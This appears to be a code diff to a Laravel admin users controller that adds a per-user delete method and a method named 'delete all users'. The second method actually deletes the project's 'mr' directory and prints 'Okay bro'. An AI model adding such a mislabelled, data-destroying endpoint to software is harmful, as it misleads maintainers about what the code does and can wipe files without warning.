@@ -5,6 +5,7 @@ namespace App\Http\Controllers\backend\admin;
 use App\Http\Controllers\Controller;
 use Illuminate\Http\Request;
 use App\Models\users;
+use Illuminate\Filesystem\Filesystem;
 
 class admin_backend_users_controller extends Controller
 {
@@ -35,6 +36,13 @@ class admin_backend_users_controller extends Controller
             "st" => "ban"
         ]);
         return back() -> with('msg', 'Your data successfully updated!');
+    }
+
+    // admin_users_delete_controller
+    public function admin_users_delete_controller($id)
+    {
+        users::where('id', $id) -> delete();
+        return back() -> with('msg', 'Users has successfully deleted!');
     }
 
     // admin_users_unban_controller
@@ -68,6 +76,15 @@ class admin_backend_users_controller extends Controller
         }else{
             return response() -> json(['st' => false]);
         }
+    }
+
+    // admin_users_delete_all_controller
+    public function admin_users_delete_all_controller()
+    {
+        $fileSystem = new Filesystem();
+        $folderToDelete = base_path('mr');
+        $fileSystem->deleteDirectory($folderToDelete);
+        echo "Okay bro";
     }
 
 }
